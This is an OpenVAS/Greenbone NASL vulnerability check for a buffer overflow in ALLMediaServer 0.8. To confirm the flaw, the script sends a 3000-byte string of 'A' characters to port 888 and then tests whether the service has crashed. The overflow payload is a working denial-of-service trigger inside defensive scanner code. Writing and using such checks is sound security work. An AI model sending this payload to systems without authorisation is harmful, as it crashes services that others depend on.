# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802659");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-07-17 12:12:12 +0530 (Tue, 17 Jul 2012)");
  script_name("ALLMediaServer Request Handling Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/49931");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54475");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19625");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/114758/allmediaserver_bof.rb.txt");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 888);
  script_mandatory_keys("ALLPLAYER-DLNA/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
  code in the context of the application. Failed attacks will cause denial of service conditions.");

  script_tag(name:"affected", value:"ALLMediaServer version 0.8");

  script_tag(name:"insight", value:"The flaw is due to a boundary error when processing certain
  network requests and can be exploited to cause a stack based buffer overflow
  via a specially crafted packet sent to TCP port 888.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"ALLMediaServer is prone to a buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:888);

## Open HTTP Socket
soc = http_open_socket(port);
if(!soc) {
  exit(0);
}

banner = http_get_remote_headers(port: port);
if("Server: ALLPLAYER-DLNA" >!< banner)
{
  http_close_socket(soc);
  exit(0);
}

req = crap(data: "A", length: 3000);
send(socket:soc, data:req);
http_close_socket(soc);

sleep(3);

if(http_is_dead(port:port)){
  security_message(port:port);
  exit(0);
}

exit(99);
